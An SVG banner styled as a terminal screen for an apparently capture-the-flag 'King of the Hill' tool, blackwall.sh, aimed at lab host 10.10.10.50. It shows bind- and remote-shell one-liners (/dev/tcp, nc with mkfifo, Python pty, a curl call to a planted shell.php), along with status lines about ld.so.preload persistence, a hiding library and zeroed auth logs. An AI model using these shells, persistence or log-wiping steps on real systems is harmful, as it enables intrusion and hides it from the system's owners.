<svg xmlns="http://www.w3.org/2000/svg" width="900" height="520" viewBox="0 0 900 520" font-family="Cascadia Mono, JetBrains Mono, Consolas, monospace">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#070203"/>
      <stop offset="1" stop-color="#120306"/>
    </linearGradient>
    <pattern id="scan" width="100%" height="4" patternUnits="userSpaceOnUse">
      <rect width="100%" height="2" fill="#000000" opacity="0.22"/>
    </pattern>
  </defs>

  <rect width="900" height="520" fill="url(#bg)"/>
  <rect width="900" height="520" fill="url(#scan)"/>

  <rect x="18" y="18" width="864" height="484" rx="8" fill="#0a0203" stroke="#3a0d12"/>
  <line x1="18" y1="58" x2="882" y2="58" stroke="#3a0d12"/>
  <circle cx="40" cy="38" r="5" fill="#ff2d2d"/>
  <circle cx="58" cy="38" r="5" fill="#7a1a22"/>
  <circle cx="76" cy="38" r="5" fill="#7a1a22"/>
  <text x="96" y="43" fill="#8a2a33" font-size="12">blackwall.sh -K -t 10.10.10.50</text>
  <text x="660" y="43" fill="#ff2d2d" font-size="12" letter-spacing="2">KOTH BATTLE STATION</text>

  <text x="36" y="86" fill="#ff2d2d" font-size="13" font-weight="bold">░▒▓ MX:// KING OF THE HILL ▓▒░</text>
  <text x="36" y="108" fill="#8a2a33" font-size="12">PROJECT BLACKWALL // BIND FORGE // HYDRA // SHADOW // WALL</text>

  <text x="36" y="140" fill="#ff6a6a" font-size="12">TARGET</text>
  <text x="160" y="140" fill="#ff9a9a" font-size="12">10.10.10.50</text>
  <text x="420" y="140" fill="#ff6a6a" font-size="12">BIND</text>
  <text x="480" y="140" fill="#ff9a9a" font-size="12">4242</text>
  <text x="620" y="140" fill="#ff6a6a" font-size="12">CHAIN</text>
  <text x="680" y="140" fill="#ff9a9a" font-size="12">www-data → root</text>

  <rect x="36" y="156" width="828" height="112" rx="6" fill="#120306" stroke="#4a0f16"/>
  <text x="52" y="178" fill="#ff4a4a" font-size="12">[PHP:exec]</text>
  <text x="160" y="178" fill="#ff9a9a" font-size="12">curl -s "http://10.10.10.50:20000/shell.php" --data-urlencode "x=&lt;b64&gt;"</text>
  <text x="52" y="198" fill="#ff4a4a" font-size="12">[BASH]</text>
  <text x="160" y="198" fill="#ff9a9a" font-size="12">exec 3&lt;&gt;/dev/tcp/0.0.0.0/4242; sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</text>
  <text x="52" y="218" fill="#ff4a4a" font-size="12">[PY:RAW]</text>
  <text x="160" y="218" fill="#ff9a9a" font-size="12">python3 -c "import socket,os,pty,_thread ..."</text>
  <text x="52" y="238" fill="#ff4a4a" font-size="12">[NC:FIFO]</text>
  <text x="160" y="238" fill="#ff9a9a" font-size="12">mkfifo /tmp/.ds_4242; cat | /bin/bash | nc -lvnp 4242</text>
  <text x="52" y="258" fill="#ff4a4a" font-size="12">[LNK:VPN]</text>
  <text x="160" y="258" fill="#ff9a9a" font-size="12">nc 10.10.10.50 4242 -v</text>

  <text x="36" y="298" fill="#ff6a6a" font-size="12">HYDRA</text>
  <text x="160" y="298" fill="#ff9a9a" font-size="12">flock: 8 arms, one shared 2s tick, cron + timer + ld.so.preload</text>
  <text x="36" y="318" fill="#ff6a6a" font-size="12">SHADOW</text>
  <text x="160" y="318" fill="#8a2a33" font-size="12">hide.so preloaded, auth.log zeroed, HISTSIZE=0</text>
  <text x="36" y="338" fill="#ff6a6a" font-size="12">WALL</text>
  <text x="160" y="338" fill="#ff8f00" font-size="12">BLK_IN active, 4242 → 10.8.0.2 only, ssh key pinned</text>
  <text x="36" y="358" fill="#ff6a6a" font-size="12">CAPTURE</text>
  <text x="160" y="358" fill="#ff9a9a" font-size="12">seed sealed: hill-ctl captured, 30s over-claim shield</text>

  <text x="36" y="396" fill="#8a2a33" font-size="12" font-style="italic">RIPPER  connection dropped, backdoor untouched</text>
  <text x="36" y="416" fill="#ff2d2d" font-size="12" font-style="italic">RECLAIM  bind returned in 4s</text>
  <rect x="184" y="404" width="8" height="14" fill="#ff2d2d">
    <animate attributeName="opacity" values="1;1;0;0" dur="1.1s" repeatCount="indefinite"/>
  </rect>

  <text x="36" y="462" fill="#7a1a22" font-size="11">"The code behind me has begun to permeate the physical world."</text>
  <text x="36" y="484" fill="#3a0d12" font-size="11">PROJECT BLACKWALL // CYNOSURE MILITECH ARCHIVES // 2026</text>
</svg>
